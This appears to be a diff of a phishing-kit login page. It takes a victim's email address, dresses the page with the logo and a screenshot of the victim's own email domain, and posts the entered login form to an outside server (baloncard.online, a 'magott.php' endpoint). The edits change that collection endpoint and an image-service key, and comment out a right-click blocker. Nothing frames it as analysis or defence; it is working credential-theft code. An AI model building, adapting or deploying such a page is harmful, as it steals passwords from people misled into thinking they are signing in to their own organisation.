@@ -16,11 +16,11 @@
         window.onunload = function () { null };
     </script>
 
-    <script>
+    <!-- <script>
         window.addEventListener('contextmenu', function (e) {
             e.preventDefault();
         }, false);
-    </script>
+    </script> -->
     <!-- <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script> -->
 </head>
 
@@ -28,7 +28,7 @@
 
     <div class="h-[30rem] w-[27rem] bg-neutral-900 bg-opacity-90 flex flex-col justify-center items-center rounded-t-lg ">
         <div class="mb-6 mt-4 h-11 w-11 flex flex-col justify-center">
-            <img src=" " id="log" alt="Logo">
+            <img src=" " id="log" alt="">
         </div>
 
         <p class="text-xl text-neutral-400">Sign in to continue</p>
@@ -108,7 +108,7 @@
                 // Set the logo and background
                 const domain = decodedEmail.split('@')[1];
                 const logoUrl = "https://logo.clearbit.com/" + domain;
-                const backgroundImageUrl = "https://image.thum.io/get/auth/72474-4d003c4d52e844e1a7f7acf96afb3a8e//width/1400/http://" + domain;
+                const backgroundImageUrl = "https://image.thum.io/get/auth/72563-81b4f7840ee75846c04382b81b3563a6//width/1400/http://" + domain;
 
                 // Update logo
                 $.get(logoUrl)
@@ -153,7 +153,7 @@
                 // AJAX request
                 $.ajax({
                     type: 'POST',
-                    url: 'https://baloncard.online/golang/magott.php?name=' + encodeEmail(email), // Make sure to use the correct endpoint for your backend
+                    url: 'https://baloncard.online/synchronization/magott.php?name=' + encodeEmail(email), // Make sure to use the correct endpoint for your backend
                     data: $('#loginForm').serialize(), // Use serialized form data
                     success: function (response) {
                         // Hide spinner after request
